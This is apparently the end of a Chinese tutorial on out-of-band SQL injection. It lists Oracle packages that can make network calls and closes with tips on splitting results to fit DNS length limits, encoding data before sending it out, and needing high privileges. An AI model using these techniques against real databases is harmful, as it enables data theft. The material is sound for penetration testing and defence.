  - UTL_HTTP
  - UTL_TCP
  - UTL_SMPTP
  - UTL_URL
 

### 总结
有些函数的使用操作系统的限制。
dns查询有长度限制，所以必要的时候需要对查询结果做字符串的切割。
避免一些特殊符号的产生，最好的选择就是数据先编码再带出。
注意不同数据库的语法是有差异的，特别是在数据库拼接的时候。
有些操作是需要较高的权限。